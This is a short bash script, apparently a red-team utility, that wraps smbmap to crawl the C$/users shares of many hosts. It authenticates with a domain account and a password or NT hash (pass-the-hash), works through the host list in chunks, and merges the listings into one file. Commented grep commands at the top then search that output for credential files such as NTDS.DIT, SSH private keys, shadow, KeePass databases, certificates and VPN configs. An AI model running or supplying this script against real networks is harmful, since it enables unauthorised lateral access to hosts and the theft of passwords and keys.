#!/bin/bash

#RUN TWEAKED VERSION OF THESE COMMANDS ON RESULTS
#grep -v "fileSize:0" greppableOutputFile.txt | grep -Ei "(NTDS\.DIT|pwd\.db|\.ps1|\.one|\.kdbx|\.vmdk|\.ppk|\.psafe3|\.cscfg|\.kwallet|\.tblk|\.ovpn|\.mdf|\.sdf|\.sqldumpl|\.config|\.inf|\.cnf|\.conf|\.der|\.pfx)[\,\s]" 
#grep -v "fileSize:0" greppableOutputFile.txt | grep -Ei "(id_rsa|id_dsa|shadow|pass|passwd|creds|access|credential)" 

# Don't Panic - Define Variables
echo "Initializing the Improbability Drive for SMB mapping..."
domainName="widgetInc"
username="jdoe"
#Passord or Hash
password='31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0'
outputFile="greppableOutputFile.txt"
chunkSize=42  # Because 42 is the Answer to the Ultimate Question of Life, the Universe, and Everything
listOfIPs="listOfIPs.txt" # Path to your listOfIPs file

# Split listOfIPs file into chunks
echo "Preparing to split your universe of IPs into small, manageable planets..."
split -l $chunkSize "$listOfIPs" listOfIPs_chunk_

# Function to display first and last line of a file
function display_first_last {
    local filename=$1
    local firstLine=$(head -n 1 "$filename")
    local lastLine=$(tail -n 1 "$filename")

    if [ "$firstLine" == "$lastLine" ]; then
        echo "STATUS: $firstLine"
    else
        echo "STATUS: $firstLine ... $lastLine"
    fi
}

# Process each chunk
for file in listOfIPs_chunk_*
do
    echo "Engaging with $file. Don't forget your towel..."
    display_first_last "$file"
        python ~/Documents/Tools/smbmap/smbmap/smbmap.py --host-file "$file" -d "$domainName" -u "$username" -p "$password" --no-write-check -r 'C$/users' --depth 4 -g "temp_$file.txt"
    cat "temp_$file.txt" >> "$outputFile"
    rm "temp_$file.txt"  # Cleaning up the Vogon poetry (i.e., temporary files)

    # Display first and last line of the chunk
    display_first_last "$file"

    echo "Finished mapping $file. On to the next intergalactic adventure!"
done

echo "All chunks processed. The Heart of Gold would be proud. Output saved to $outputFile."
echo "Remember: 42 is the answer, but what on Earth is the question?"
